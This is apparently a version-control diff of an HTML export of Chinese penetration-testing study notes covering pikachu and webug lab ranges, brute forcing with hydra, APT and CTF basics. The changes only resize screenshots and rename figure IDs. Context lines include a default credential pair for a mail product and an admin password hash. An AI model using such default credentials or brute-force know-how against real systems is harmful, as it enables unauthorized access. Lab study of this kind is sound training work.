 </p>
 
 
-<figure id="orgea7e5f6">
-<img src="./images/img_20230718_143223.png" alt="img_20230718_143223.png" width="60%">
+<figure id="org80ea3dc">
+<img src="./images/img_20230718_143223.png" alt="img_20230718_143223.png" width="90%">
 
 </figure>
 
@@ -9668,8 +9843,8 @@ admin以及21232f297a57a5a743894a0e4a801fc3，即web管理员的账号密码
 </div>
 
 
-<figure id="org4776a90">
-<img src="./images/img_20230718_143258.png" alt="img_20230718_143258.png" width="60%">
+<figure id="org4e57170">
+<img src="./images/img_20230718_143258.png" alt="img_20230718_143258.png" width="90%">
 
 </figure>
 </div>
@@ -9883,8 +10058,8 @@ pikachu 靶场 Over Permission
 </p>
 
 
-<figure id="orgd8db411">
-<img src="./images/img_20230718_143954.png" alt="img_20230718_143954.png" width="60%">
+<figure id="orga4e32e0">
+<img src="./images/img_20230718_143954.png" alt="img_20230718_143954.png" width="90%">
 
 </figure>
 
@@ -9898,8 +10073,8 @@ pikachu 靶场 Over Permission
 
 
 
-<figure id="org9359994">
-<img src="./images/img_20230718_144018.png" alt="img_20230718_144018.png" width="60%">
+<figure id="orgd2f6f20">
+<img src="./images/img_20230718_144018.png" alt="img_20230718_144018.png" width="90%">
 
 </figure>
 </div>
@@ -9919,8 +10094,8 @@ admin是超级管理员，具有添加/删除用户权限，而pikachu没有
 
 
 
-<figure id="orgfc4f58e">
-<img src="./images/img_20230718_144102.png" alt="img_20230718_144102.png" width="60%">
+<figure id="org8751659">
+<img src="./images/img_20230718_144102.png" alt="img_20230718_144102.png" width="90%">
 
 </figure>
 
@@ -9949,8 +10124,8 @@ admin是超级管理员，具有添加/删除用户权限，而pikachu没有
 
 
 
-<figure id="org331e267">
-<img src="./images/img_20230718_144213.png" alt="img_20230718_144213.png" width="60%">
+<figure id="org07dd778">
+<img src="./images/img_20230718_144213.png" alt="img_20230718_144213.png" width="90%">
 
 </figure>
 
@@ -9960,8 +10135,8 @@ admin是超级管理员，具有添加/删除用户权限，而pikachu没有
 
 
 
-<figure id="orgb418ad3">
-<img src="./images/img_20230718_144227.png" alt="img_20230718_144227.png" width="60%">
+<figure id="org8996b0f">
+<img src="./images/img_20230718_144227.png" alt="img_20230718_144227.png" width="90%">
 
 </figure>
 </div>
@@ -10159,8 +10334,8 @@ docker run -d -p 8082:80 -p 33060:3306 area39/webug
 
 
 
-<figure id="orgea143b6">
-<img src="./images/img_20230718_144819.png" alt="img_20230718_144819.png" width="60%">
+<figure id="org5441b9e">
+<img src="./images/img_20230718_144819.png" alt="img_20230718_144819.png" width="90%">
 
 </figure>
 
@@ -10175,8 +10350,8 @@ docker run -d -p 8082:80 -p 33060:3306 area39/webug
 
 
 
-<figure id="org74f15ac">
-<img src="./images/img_20230718_144846.png" alt="img_20230718_144846.png" width="60%">
+<figure id="orgce974e5">
+<img src="./images/img_20230718_144846.png" alt="img_20230718_144846.png" width="90%">
 
 </figure>
 
@@ -10192,8 +10367,8 @@ docker run -d -p 8082:80 -p 33060:3306 area39/webug
 </ul>
 
 
-<figure id="org0773dbd">
-<img src="./images/img_20230718_144920.png" alt="img_20230718_144920.png" width="60%">
+<figure id="orgec64e1b">
+<img src="./images/img_20230718_144920.png" alt="img_20230718_144920.png" width="90%">
 
 </figure>
 </div>
@@ -10207,8 +10382,8 @@ web 靶场 &#x2013;&gt; 逻辑漏洞 &#x2013;&gt; 越权修改密码
 </p>
 
 
-<figure id="org880816c">
-<img src="./images/img_20230718_145043.png" alt="img_20230718_145043.png" width="60%">
+<figure id="org2d00e97">
+<img src="./images/img_20230718_145043.png" alt="img_20230718_145043.png" width="90%">
 
 </figure>
 
@@ -10217,8 +10392,8 @@ web 靶场 &#x2013;&gt; 逻辑漏洞 &#x2013;&gt; 越权修改密码
 </p>
 
 
-<figure id="orgece542c">
-<img src="./images/img_20230718_145056.png" alt="img_20230718_145056.png" width="60%">
+<figure id="org1c4a72b">
+<img src="./images/img_20230718_145056.png" alt="img_20230718_145056.png" width="90%">
 
 </figure>
 
@@ -10253,8 +10428,8 @@ id username password
 </ul>
 
 
-<figure id="org18c8d02">
-<img src="./images/img_20230718_145314.png" alt="img_20230718_145314.png" width="60%">
+<figure id="orgc16f0d2">
+<img src="./images/img_20230718_145314.png" alt="img_20230718_145314.png" width="90%">
 
 </figure>
 
@@ -10263,15 +10438,15 @@ id username password
 </p>
 
 
-<figure id="org1572f4b">
-<img src="./images/img_20230718_145330.png" alt="img_20230718_145330.png" width="60%">
+<figure id="orgdbe5618">
+<img src="./images/img_20230718_145330.png" alt="img_20230718_145330.png" width="90%">
 
 </figure>
 
 
 
-<figure id="org280d64c">
-<img src="./images/img_20230718_145347.png" alt="img_20230718_145347.png" width="60%">
+<figure id="org2982516">
+<img src="./images/img_20230718_145347.png" alt="img_20230718_145347.png" width="90%">
 
 </figure>
 
@@ -10281,8 +10456,8 @@ id username password
 
 
 
-<figure id="org4ab4ebb">
-<img src="./images/img_20230718_145409.png" alt="img_20230718_145409.png" width="60%">
+<figure id="org7548993">
+<img src="./images/img_20230718_145409.png" alt="img_20230718_145409.png" width="90%">
 
 </figure>
 
@@ -10291,8 +10466,8 @@ id username password
 </p>
 
 
-<figure id="org17634c7">
-<img src="./images/img_20230718_145423.png" alt="img_20230718_145423.png" width="60%">
+<figure id="org9a100fc">
+<img src="./images/img_20230718_145423.png" alt="img_20230718_145423.png" width="90%">
 
 </figure>
 
@@ -10339,8 +10514,8 @@ mysql&gt; <span style="color: #a020f0;">select</span> * <span style="color: #a02
 </p>
 
 
-<figure id="org3a8f4dc">
-<img src="./images/img_20230718_145552.png" alt="img_20230718_145552.png" width="60%">
+<figure id="org48d47b5">
+<img src="./images/img_20230718_145552.png" alt="img_20230718_145552.png" width="90%">
 
 </figure>
 </div>
@@ -10354,8 +10529,8 @@ mysql&gt; <span style="color: #a020f0;">select</span> * <span style="color: #a02
 
 
 
-<figure id="org9d65019">
-<img src="./images/img_20230718_145630.png" alt="img_20230718_145630.png" width="60%">
+<figure id="org4e4ce85">
+<img src="./images/img_20230718_145630.png" alt="img_20230718_145630.png" width="90%">
 
 </figure>
 
@@ -10364,8 +10539,8 @@ mysql&gt; <span style="color: #a020f0;">select</span> * <span style="color: #a02
 </p>
 
 
-<figure id="org8015383">
-<img src="./images/img_20230718_145653.png" alt="img_20230718_145653.png" width="60%">
+<figure id="orge42f10c">
+<img src="./images/img_20230718_145653.png" alt="img_20230718_145653.png" width="90%">
 
 </figure>
 
@@ -10375,8 +10550,8 @@ mysql&gt; <span style="color: #a020f0;">select</span> * <span style="color: #a02
 
 
 
-<figure id="orgce6fcd2">
-<img src="./images/img_20230718_145710.png" alt="img_20230718_145710.png" width="60%">
+<figure id="org897281c">
+<img src="./images/img_20230718_145710.png" alt="img_20230718_145710.png" width="90%">
 
 </figure>
 </div>
@@ -10393,15 +10568,15 @@ mysql&gt; <span style="color: #a020f0;">select</span> * <span style="color: #a02
 </p>
 
 
-<figure id="org770031b">
-<img src="./images/img_20230718_145731.png" alt="img_20230718_145731.png" width="60%">
+<figure id="org678dff8">
+<img src="./images/img_20230718_145731.png" alt="img_20230718_145731.png" width="90%">
 
 </figure>
 
 
 
-<figure id="org85c3135">
-<img src="./images/img_20230718_145748.png" alt="img_20230718_145748.png" width="60%">
+<figure id="org90e5085">
+<img src="./images/img_20230718_145748.png" alt="img_20230718_145748.png" width="90%">
 
 </figure>
 </div>
@@ -10415,8 +10590,8 @@ mysql&gt; <span style="color: #a020f0;">select</span> * <span style="color: #a02
 
 
 
-<figure id="orgf8791dc">
-<img src="./images/img_20230718_145809.png" alt="img_20230718_145809.png" width="60%">
+<figure id="orgdb1b7ab">
+<img src="./images/img_20230718_145809.png" alt="img_20230718_145809.png" width="90%">
 
 </figure>
 
@@ -10426,8 +10601,8 @@ mysql&gt; <span style="color: #a020f0;">select</span> * <span style="color: #a02
 </p>
 
 
-<figure id="org57c9b65">
-<img src="./images/img_20230718_145822.png" alt="img_20230718_145822.png" width="60%">
+<figure id="org416277f">
+<img src="./images/img_20230718_145822.png" alt="img_20230718_145822.png" width="90%">
 
 </figure>
 
@@ -10436,8 +10611,8 @@ mysql&gt; <span style="color: #a020f0;">select</span> * <span style="color: #a02
 </p>
 
 
-<figure id="org07da36c">
-<img src="./images/img_20230718_145837.png" alt="img_20230718_145837.png" width="60%">
+<figure id="org926c3a8">
+<img src="./images/img_20230718_145837.png" alt="img_20230718_145837.png" width="90%">
 
 </figure>
 </div>
@@ -10529,8 +10704,8 @@ B/S架构即浏览器/服务器结构暴力破解：
 
 
 
-<figure id="org9414b53">
-<img src="./images/img_20230718_150202.png" alt="img_20230718_150202.png" width="60%">
+<figure id="org78467f1">
+<img src="./images/img_20230718_150202.png" alt="img_20230718_150202.png" width="90%">
 
 </figure>
 
@@ -10539,8 +10714,8 @@ B/S架构即浏览器/服务器结构暴力破解：
 </p>
 
 
-<figure id="orgb32b212">
-<img src="./images/img_20230718_150223.png" alt="img_20230718_150223.png" width="60%">
+<figure id="org5f848a0">
+<img src="./images/img_20230718_150223.png" alt="img_20230718_150223.png" width="90%">
 
 </figure>
 
@@ -10549,8 +10724,8 @@ B/S架构即浏览器/服务器结构暴力破解：
 </p>
 
 
-<figure id="org573fd72">
-<img src="./images/img_20230718_150240.png" alt="img_20230718_150240.png" width="60%">
+<figure id="org3a8bdf8">
+<img src="./images/img_20230718_150240.png" alt="img_20230718_150240.png" width="90%">
 
 </figure>
 
@@ -10564,8 +10739,8 @@ B/S架构即浏览器/服务器结构暴力破解：
 </p>
 
 
-<figure id="org301ef62">
-<img src="./images/img_20230718_150320.png" alt="img_20230718_150320.png" width="60%">
+<figure id="orgf7c35e5">
+<img src="./images/img_20230718_150320.png" alt="img_20230718_150320.png" width="90%">
 
 </figure>
 
@@ -10574,8 +10749,8 @@ B/S架构即浏览器/服务器结构暴力破解：
 </p>
 
 
-<figure id="org8a34d24">
-<img src="./images/img_20230718_150337.png" alt="img_20230718_150337.png" width="60%">
+<figure id="orgcce4f72">
+<img src="./images/img_20230718_150337.png" alt="img_20230718_150337.png" width="90%">
 
 </figure>
 
@@ -10589,8 +10764,8 @@ B/S架构即浏览器/服务器结构暴力破解：
 </p>
 
 
-<figure id="org329b039">
-<img src="./images/img_20230718_150409.png" alt="img_20230718_150409.png" width="60%">
+<figure id="org0955576">
+<img src="./images/img_20230718_150409.png" alt="img_20230718_150409.png" width="90%">
 
 </figure>
 
@@ -10600,8 +10775,8 @@ B/S架构即浏览器/服务器结构暴力破解：
 
 
 
-<figure id="org52335da">
-<img src="./images/img_20230718_150443.png" alt="img_20230718_150443.png" width="60%">
+<figure id="orgbed413e">
+<img src="./images/img_20230718_150443.png" alt="img_20230718_150443.png" width="90%">
 
 </figure>
 
@@ -10610,8 +10785,8 @@ B/S架构即浏览器/服务器结构暴力破解：
 </p>
 
 
-<figure id="org4dae681">
-<img src="./images/img_20230718_150459.png" alt="img_20230718_150459.png" width="60%">
+<figure id="org5eac63e">
+<img src="./images/img_20230718_150459.png" alt="img_20230718_150459.png" width="90%">
 
 </figure>
 </div>
@@ -10690,8 +10865,8 @@ hydra常用参数：
 </ul>
 
 
-<figure id="org4f31d46">
-<img src="./images/img_20230728_162152.png" alt="img_20230728_162152.png" width="60%">
+<figure id="orgdb1bd5c">
+<img src="./images/img_20230728_162152.png" alt="img_20230728_162152.png" width="90%">
 
 </figure>
 
@@ -10719,15 +10894,15 @@ hydra常用参数：
 
 
 
-<figure id="org4b99888">
-<img src="./images/img_20230718_150821.png" alt="img_20230718_150821.png" width="60%">
+<figure id="orge8a7677">
+<img src="./images/img_20230718_150821.png" alt="img_20230718_150821.png" width="90%">
 
 </figure>
 
 
 
-<figure id="orgee54be8">
-<img src="./images/img_20230718_150832.png" alt="img_20230718_150832.png" width="60%">
+<figure id="orgdac376d">
+<img src="./images/img_20230718_150832.png" alt="img_20230718_150832.png" width="90%">
 
 </figure>
 
@@ -10740,8 +10915,8 @@ hydra常用参数：
 </p>
 
 
-<figure id="org6cb4395">
-<img src="./images/img_20230718_150936.png" alt="img_20230718_150936.png" width="60%">
+<figure id="org4c4317d">
+<img src="./images/img_20230718_150936.png" alt="img_20230718_150936.png" width="90%">
 
 </figure>
 
@@ -10750,15 +10925,15 @@ hydra常用参数：
 </p>
 
 
-<figure id="orgd286375">
-<img src="./images/img_20230718_150925.png" alt="img_20230718_150925.png" width="60%">
+<figure id="org99f12f3">
+<img src="./images/img_20230718_150925.png" alt="img_20230718_150925.png" width="90%">
 
 </figure>
 
 
 
-<figure id="org224c08c">
-<img src="./images/img_20230718_150955.png" alt="img_20230718_150955.png" width="60%">
+<figure id="orgeaeb829">
+<img src="./images/img_20230718_150955.png" alt="img_20230718_150955.png" width="90%">
 
 </figure>
 
@@ -10767,8 +10942,8 @@ hydra常用参数：
 </p>
 
 
-<figure id="orgea79a94">
-<img src="./images/img_20230718_151012.png" alt="img_20230718_151012.png" width="60%">
+<figure id="org9cb8995">
+<img src="./images/img_20230718_151012.png" alt="img_20230718_151012.png" width="90%">
 
 </figure>
 
@@ -10819,14 +10994,14 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="org211f7f0">
-<img src="./images/img_20230718_151248.png" alt="img_20230718_151248.png" width="60%">
+<figure id="orgebacd38">
+<img src="./images/img_20230718_151248.png" alt="img_20230718_151248.png" width="90%">
 
 </figure>
 
 
-<figure id="orgeafdc7d">
-<img src="./images/img_20230718_151305.png" alt="img_20230718_151305.png" width="60%">
+<figure id="org3bfe06a">
+<img src="./images/img_20230718_151305.png" alt="img_20230718_151305.png" width="90%">
 
 </figure>
 
@@ -10835,14 +11010,14 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="org5fc5957">
-<img src="./images/img_20230718_151321.png" alt="img_20230718_151321.png" width="60%">
+<figure id="org48790db">
+<img src="./images/img_20230718_151321.png" alt="img_20230718_151321.png" width="90%">
 
 </figure>
 
 
-<figure id="org304f85f">
-<img src="./images/img_20230718_151336.png" alt="img_20230718_151336.png" width="60%">
+<figure id="org7c343ef">
+<img src="./images/img_20230718_151336.png" alt="img_20230718_151336.png" width="90%">
 
 </figure>
 
@@ -10854,8 +11029,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </ul>
 
 
-<figure id="org8b8cc87">
-<img src="./images/img_20230718_151410.png" alt="img_20230718_151410.png" width="60%">
+<figure id="org9216897">
+<img src="./images/img_20230718_151410.png" alt="img_20230718_151410.png" width="90%">
 
 </figure>
 
@@ -10934,8 +11109,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </ul>
 
 
-<figure id="org2b46676">
-<img src="./images/img_20230718_151549.png" alt="img_20230718_151549.png" width="60%">
+<figure id="org0c48ac1">
+<img src="./images/img_20230718_151549.png" alt="img_20230718_151549.png" width="90%">
 
 </figure>
 
@@ -10947,8 +11122,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </ul>
 
 
-<figure id="org15dd764">
-<img src="./images/img_20230718_151605.png" alt="img_20230718_151605.png" width="60%">
+<figure id="org5136cfd">
+<img src="./images/img_20230718_151605.png" alt="img_20230718_151605.png" width="90%">
 
 </figure>
 
@@ -10962,8 +11137,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </div>
 
 
-<figure id="org989d8e5">
-<img src="./images/img_20230718_151628.png" alt="img_20230718_151628.png" width="60%">
+<figure id="orga2ec483">
+<img src="./images/img_20230718_151628.png" alt="img_20230718_151628.png" width="90%">
 
 </figure>
 
@@ -10975,14 +11150,14 @@ win7系统中启动MySQL服务，查看账号密码：
 </ul>
 
 
-<figure id="orgc41f298">
-<img src="./images/img_20230718_151652.png" alt="img_20230718_151652.png" width="60%">
+<figure id="org87f9195">
+<img src="./images/img_20230718_151652.png" alt="img_20230718_151652.png" width="90%">
 
 </figure>
 
 
-<figure id="org5aabfbf">
-<img src="./images/img_20230718_151718.png" alt="img_20230718_151718.png" width="60%">
+<figure id="org9f9b309">
+<img src="./images/img_20230718_151718.png" alt="img_20230718_151718.png" width="90%">
 
 </figure>
 
@@ -10991,8 +11166,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="orgedeb3ac">
-<img src="./images/img_20230718_151732.png" alt="img_20230718_151732.png" width="60%">
+<figure id="org2c51774">
+<img src="./images/img_20230718_151732.png" alt="img_20230718_151732.png" width="90%">
 
 </figure>
 
@@ -11001,8 +11176,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="orgeb1fd87">
-<img src="./images/img_20230718_151754.png" alt="img_20230718_151754.png" width="60%">
+<figure id="org9d6d79a">
+<img src="./images/img_20230718_151754.png" alt="img_20230718_151754.png" width="90%">
 
 </figure>
 
@@ -11011,8 +11186,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="org501e5c2">
-<img src="./images/img_20230718_151813.png" alt="img_20230718_151813.png" width="60%">
+<figure id="org038d6dd">
+<img src="./images/img_20230718_151813.png" alt="img_20230718_151813.png" width="90%">
 
 </figure>
 
@@ -11032,8 +11207,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="org700db42">
-<img src="./images/img_20230718_151900.png" alt="img_20230718_151900.png" width="60%">
+<figure id="org4cfb2a9">
+<img src="./images/img_20230718_151900.png" alt="img_20230718_151900.png" width="90%">
 
 </figure>
 
@@ -11042,8 +11217,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="org8483c67">
-<img src="./images/img_20230718_151916.png" alt="img_20230718_151916.png" width="60%">
+<figure id="org5e7b3e0">
+<img src="./images/img_20230718_151916.png" alt="img_20230718_151916.png" width="90%">
 
 </figure>
 
@@ -11057,8 +11232,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </div>
 
 
-<figure id="org99eb201">
-<img src="./images/img_20230718_152018.png" alt="img_20230718_152018.png" width="60%">
+<figure id="orgf9d0932">
+<img src="./images/img_20230718_152018.png" alt="img_20230718_152018.png" width="90%">
 
 </figure>
 
@@ -11067,8 +11242,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="org401df3f">
-<img src="./images/img_20230718_152034.png" alt="img_20230718_152034.png" width="60%">
+<figure id="org5b483e9">
+<img src="./images/img_20230718_152034.png" alt="img_20230718_152034.png" width="90%">
 
 </figure>
 
@@ -11077,8 +11252,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="org8fee771">
-<img src="./images/img_20230718_152049.png" alt="img_20230718_152049.png" width="60%">
+<figure id="orge7882b9">
+<img src="./images/img_20230718_152049.png" alt="img_20230718_152049.png" width="90%">
 
 </figure>
 
@@ -11087,8 +11262,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="org14f1c53">
-<img src="./images/img_20230718_152102.png" alt="img_20230718_152102.png" width="60%">
+<figure id="org894407c">
+<img src="./images/img_20230718_152102.png" alt="img_20230718_152102.png" width="90%">
 
 </figure>
 
@@ -11097,8 +11272,8 @@ win7系统中启动MySQL服务，查看账号密码：
 </p>
 
 
-<figure id="orgfdee20b">
-<img src="./images/img_20230718_152120.png" alt="img_20230718_152120.png" width="60%">
+<figure id="org085e8e9">
+<img src="./images/img_20230718_152120.png" alt="img_20230718_152120.png" width="90%">
 
 </figure>
 </div>
@@ -11310,8 +11485,8 @@ APT（Advanced Persistent Threat）即高级持续性威胁，是一种周期较
 </p>
 
 
-<figure id="org40b8222">
-<img src="./images/img_20230718_152707.png" alt="img_20230718_152707.png" width="60%">
+<figure id="org27a99cf">
+<img src="./images/img_20230718_152707.png" alt="img_20230718_152707.png" width="90%">
 
 </figure>
 
@@ -11320,8 +11495,8 @@ APT（Advanced Persistent Threat）即高级持续性威胁，是一种周期较
 </p>
 
 
-<figure id="org3233f74">
-<img src="./images/img_20230718_152742.png" alt="img_20230718_152742.png" width="60%">
+<figure id="orga4d258c">
+<img src="./images/img_20230718_152742.png" alt="img_20230718_152742.png" width="90%">
 
 </figure>
 
@@ -11330,8 +11505,8 @@ APT（Advanced Persistent Threat）即高级持续性威胁，是一种周期较
 </p>
 
 
-<figure id="org98f93cf">
-<img src="./images/img_20230718_152758.png" alt="img_20230718_152758.png" width="60%">
+<figure id="org4a03c05">
+<img src="./images/img_20230718_152758.png" alt="img_20230718_152758.png" width="90%">
 
 </figure>
 </div>
@@ -11393,8 +11568,8 @@ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中�
 </p>
 
 
-<figure id="org45fcac6">
-<img src="./images/img_20230718_153127.png" alt="img_20230718_153127.png" width="60%">
+<figure id="org10781f1">
+<img src="./images/img_20230718_153127.png" alt="img_20230718_153127.png" width="90%">
 
 </figure>
 
@@ -11407,8 +11582,8 @@ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中�
 </p>
 
 
-<figure id="org7af3fdc">
-<img src="./images/img_20230718_153141.png" alt="img_20230718_153141.png" width="60%">
+<figure id="org1e8183e">
+<img src="./images/img_20230718_153141.png" alt="img_20230718_153141.png" width="90%">
 
 </figure>
 
@@ -11426,8 +11601,8 @@ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中�
 </p>
 
 
-<figure id="org94b07bc">
-<img src="./images/img_20230718_153342.png" alt="img_20230718_153342.png" width="60%">
+<figure id="org047a754">
+<img src="./images/img_20230718_153342.png" alt="img_20230718_153342.png" width="90%">
 
 </figure>
 
@@ -11438,8 +11613,8 @@ CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中�
 </p>
 
 
-<figure id="org5da9523">
-<img src="./images/img_20230718_153409.png" alt="img_20230718_153409.png" width="60%">
+<figure id="org052ee8f">
+<img src="./images/img_20230718_153409.png" alt="img_20230718_153409.png" width="90%">
 
 </figure>
 
@@ -11463,8 +11638,8 @@ eyouuser/eyou_admin
 </p>
 
 
-<figure id="org3f62da5">
-<img src="./images/img_20230718_153523.png" alt="img_20230718_153523.png" width="60%">
+<figure id="org530e6e0">
+<img src="./images/img_20230718_153523.png" alt="img_20230718_153523.png" width="90%">
 
 </figure>
 </div>
@@ -11477,8 +11652,8 @@ eyouuser/eyou_admin
 </p>
 
 
-<figure id="orgdea2179">
-<img src="./images/img_20230718_163613.png" alt="img_20230718_163613.png" width="60%">
+<figure id="orgf71f5ba">
+<img src="./images/img_20230718_163613.png" alt="img_20230718_163613.png" width="90%">
 
 </figure>
 
@@ -11493,8 +11668,8 @@ Data: ctfhub
 </p>
 
 
-<figure id="org9cef624">
-<img src="./images/img_20230718_163545.png" alt="img_20230718_163545.png" width="60%">
+<figure id="org39b7b3c">
+<img src="./images/img_20230718_163545.png" alt="img_20230718_163545.png" width="90%">
 
 </figure>
 
@@ -11504,8 +11679,8 @@ Data: ctfhub
 </p>
 
 
-<figure id="org89baa6e">
-<img src="./images/img_20230718_163649.png" alt="img_20230718_163649.png" width="60%">
+<figure id="org701cd61">
+<img src="./images/img_20230718_163649.png" alt="img_20230718_163649.png" width="90%">
 
 </figure>
 
@@ -11514,8 +11689,8 @@ Data: ctfhub
 </p>
 
 
-<figure id="org739461c">
-<img src="./images/img_20230718_163700.png" alt="img_20230718_163700.png" width="60%">
+<figure id="orgae12023">
+<img src="./images/img_20230718_163700.png" alt="img_20230718_163700.png" width="90%">
 
 </figure>
 
@@ -11526,8 +11701,8 @@ Data: ctfhub
 </p>
 
 
-<figure id="org19ca998">
-<img src="./images/img_20230718_163715.png" alt="img_20230718_163715.png" width="60%">
+<figure id="orgf4e2f8d">
+<img src="./images/img_20230718_163715.png" alt="img_20230718_163715.png" width="90%">
 
 </figure>
 
@@ -11545,8 +11720,8 @@ Data: ctfhub
 </p>
 
 
-<figure id="org77848f5">
-<img src="./images/img_20230718_163756.png" alt="img_20230718_163756.png" width="60%">
+<figure id="org1468c64">
+<img src="./images/img_20230718_163756.png" alt="img_20230718_163756.png" width="90%">
 
 </figure>
 
@@ -11564,8 +11739,8 @@ Data: ctfhub
 </p>
 
 
-<figure id="org9a80c43">
-<img src="./images/img_20230718_163813.png" alt="img_20230718_163813.png" width="60%">
+<figure id="org3c8f8b0">
+<img src="./images/img_20230718_163813.png" alt="img_20230718_163813.png" width="90%">
 
 </figure>
 
@@ -11575,8 +11750,8 @@ Data: ctfhub
 </p>
 
 
-<figure id="org05c23f0">
-<img src="./images/img_20230718_163843.png" alt="img_20230718_163843.png" width="60%">
+<figure id="org0b7683c">
+<img src="./images/img_20230718_163843.png" alt="img_20230718_163843.png" width="90%">
 
 </figure>
 </div>
@@ -11585,8 +11760,8 @@ Data: ctfhub
 <h3 id="h:94aba906-455c-41c7-8a98-7d3c6ae51122">Crypto-base</h3>
 <div class="outline-text-3" id="text-h:94aba906-455c-41c7-8a98-7d3c6ae51122">
 
-<figure id="orgbebdb85">
-<img src="./images/img_20230718_163916.png" alt="img_20230718_163916.png" width="60%">
+<figure id="org911132a">
+<img src="./images/img_20230718_163916.png" alt="img_20230718_163916.png" width="90%">
 
 </figure>
 
@@ -11595,8 +11770,8 @@ Data: ctfhub
 </p>
 
 
-<figure id="org4b29bea">
-<img src="./images/img_20230718_163928.png" alt="img_20230718_163928.png" width="60%">
+<figure id="orgd8a26aa">
+<img src="./images/img_20230718_163928.png" alt="img_20230718_163928.png" width="90%">
 
 </figure>
 
@@ -11605,8 +11780,8 @@ base系列，网站目前没有提供环境
 </p>
 
 
-<figure id="org681a063">
-<img src="./images/img_20230718_163942.png" alt="img_20230718_163942.png" width="60%">
+<figure id="org5c586f1">
+<img src="./images/img_20230718_163942.png" alt="img_20230718_163942.png" width="90%">
 
 </figure>
 
@@ -11628,8 +11803,8 @@ V1ROU2JXRklWbWxsTTJ4MlpGTkNhR050VldkamJXeHVZVWhTT1E9PQ==
 <h3 id="h:9c2a9d84-7f68-4a9e-aa09-cdc7ea45d689">MISC-数据隐写</h3>
 <div class="outline-text-3" id="text-h:9c2a9d84-7f68-4a9e-aa09-cdc7ea45d689">
 
-<figure id="org1c39fb3">
-<img src="./images/img_20230718_164034.png" alt="img_20230718_164034.png" width="60%">
+<figure id="org71b5324">
+<img src="./images/img_20230718_164034.png" alt="img_20230718_164034.png" width="90%">
 
 </figure>
 
@@ -11638,8 +11813,8 @@ V1ROU2JXRklWbWxsTTJ4MlpGTkNhR050VldkamJXeHVZVWhTT1E9PQ==
 </p>
 
 
-<figure id="orgcd50e39">
-<img src="./images/img_20230718_164045.png" alt="img_20230718_164045.png" width="60%">
+<figure id="orgfe986ef">
+<img src="./images/img_20230718_164045.png" alt="img_20230718_164045.png" width="90%">
 
 </figure>
 
@@ -11648,8 +11823,8 @@ V1ROU2JXRklWbWxsTTJ4MlpGTkNhR050VldkamJXeHVZVWhTT1E9PQ==
 </p>
 
 
-<figure id="org44c27e9">
-<img src="./images/img_20230718_164141.png" alt="img_20230718_164141.png" width="60%">
+<figure id="org9c28e3e">
+<img src="./images/img_20230718_164141.png" alt="img_20230718_164141.png" width="90%">
 
 </figure>
 
@@ -11661,8 +11836,8 @@ V1ROU2JXRklWbWxsTTJ4MlpGTkNhR050VldkamJXeHVZVWhTT1E9PQ==
 <h4 id="h:76f84112-ccc7-4b5c-a960-d2775189c54b">简单隐写</h4>
 <div class="outline-text-4" id="text-h:76f84112-ccc7-4b5c-a960-d2775189c54b">
 
-<figure id="orgbc941bf">
-<img src="./images/img_20230718_164155.png" alt="img_20230718_164155.png" width="60%">
+<figure id="orgbf30f81">
+<img src="./images/img_20230718_164155.png" alt="img_20230718_164155.png" width="90%">
 
 </figure>
 
@@ -11671,8 +11846,8 @@ V1ROU2JXRklWbWxsTTJ4MlpGTkNhR050VldkamJXeHVZVWhTT1E9PQ==
 </p>
 
 
-<figure id="orgb5ddbc7">
-<img src="./images/img_20230718_164222.png" alt="img_20230718_164222.png" width="60%">
+<figure id="org46553cf">
+<img src="./images/img_20230718_164222.png" alt="img_20230718_164222.png" width="90%">
 
 </figure>
 
@@ -11681,8 +11856,8 @@ V1ROU2JXRklWbWxsTTJ4MlpGTkNhR050VldkamJXeHVZVWhTT1E9PQ==
 </p>
 
 
-<figure id="org063f720">
-<img src="./images/img_20230718_164237.png" alt="img_20230718_164237.png" width="60%">
+<figure id="orgb34d6c5">
+<img src="./images/img_20230718_164237.png" alt="img_20230718_164237.png" width="30%">
 
 </figure>
 
@@ -11693,8 +11868,8 @@ flag：
 </p>
 
 
-<figure id="org48f6ced">
-<img src="./images/img_20230718_164310.png" alt="img_20230718_164310.png" width="60%">
+<figure id="orged6650c">
+<img src="./images/img_20230718_164310.png" alt="img_20230718_164310.png" width="90%">
 
 </figure>
 
